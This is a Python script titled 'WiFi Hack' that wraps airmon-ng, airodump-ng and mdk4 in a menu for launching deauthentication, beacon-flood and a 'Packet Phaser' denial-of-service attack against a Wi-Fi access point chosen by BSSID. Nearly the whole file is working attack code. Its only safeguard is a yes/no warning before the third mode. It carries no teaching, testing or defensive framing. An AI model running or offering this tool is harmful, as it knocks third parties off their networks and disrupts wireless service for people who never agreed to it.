from colorama import init, Fore, Style
import os

def print_banner():
    print(f"""{Fore.BLUE}
    ░██╗░░░░░░░██╗██╗███████╗██╗  ██╗░░██╗░█████╗░░█████╗░██╗░░██╗
    ░██║░░██╗░░██║██║██╔════╝██║  ██║░░██║██╔══██╗██╔══██╗██║░██╔╝
    ░╚██╗████╗██╔╝██║█████╗░░██║  ███████║███████║██║░░╚═╝█████═╝░
    ░░████╔═████║░██║██╔══╝░░██║  ██╔══██║██╔══██║██║░░██╗██╔═██╗░
    ░░╚██╔╝░╚██╔╝░██║██║░░░░░██║  ██║░░██║██║░░██║╚█████╔╝██║░╚██╗
    ░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
    """)

def print_menu():
    print(f"{Fore.RED}Made by s3al4er")
    print(f"{Fore.GREEN}Attacks: \n{Fore.BLUE}1. Deauth\n2. Beacon Flood\n3. Packet Phaser")

def wlan_mon():
    print(f"{Fore.GREEN}Select a wireless interface to monitor: ")
    print(f"{Fore.BLUE}1. wlan0\n2. wlan1")
    adapter = input("Select wifi adapter (1 or 2): ")
    if adapter == "1":
        os.system("sudo airmon-ng check kill")
        os.system("sudo airmon-ng start wlan0")
        return "wlan0mon"
    elif adapter == "2":
        os.system("sudo airmon-ng check kill")
        os.system("sudo airmon-ng start wlan1")
        return "wlan1mon"
    else:
        print(f"{Fore.RED}Invalid adapter selected.")
        exit()

def deauth_attack(wlanmon):
    print("Scanning networks...")
    os.system(f"sudo airodump-ng {wlanmon}")
    bssid = input(f"{Fore.BLUE}Enter target BSSID: ")
    os.system(f"sudo mdk4 {wlanmon} d -B {bssid}")

def beacon_flood_attack(wlanmon):
    print("Scanning networks...")
    os.system(f"sudo airodump-ng {wlanmon}")
    bssid = input(f"{Fore.BLUE}Enter target BSSID: ")
    os.system(f"sudo mdk4 {wlanmon} b -B {bssid}")

def dos_attack(wlanmon):
    print("WARNING: Packet Phaser attacks are extremely dangerous. Do you really want to run it? (y/n)")
    start_dos = input()
    if start_dos.lower() == "y":
        print("Scanning networks...")
        os.system(f"sudo airodump-ng {wlanmon}")
        bssid = input(f"{Fore.BLUE}Enter target BSSID: ")
        os.system(f"sudo mdk4 {wlanmon} f -B {bssid}")
    else:
        print(f"{Fore.RED}DoS attack aborted.")
        exit()

def main():
    try:
        init()
        print_banner()
        print_menu()
        option = input(f"{Fore.RED}Option: ")
        wlanmon = wlan_mon()

        if option == "1":
            deauth_attack(wlanmon)
        elif option == "2":
            beacon_flood_attack(wlanmon)
        elif option == "3":
            dos_attack(wlanmon)
        else:
            print(f"{Fore.RED}Invalid option.")
            exit()
    except KeyboardInterrupt:
        print(f"{Fore.RED}Exiting...")
        exit()

if __name__ == "__main__":
    main()
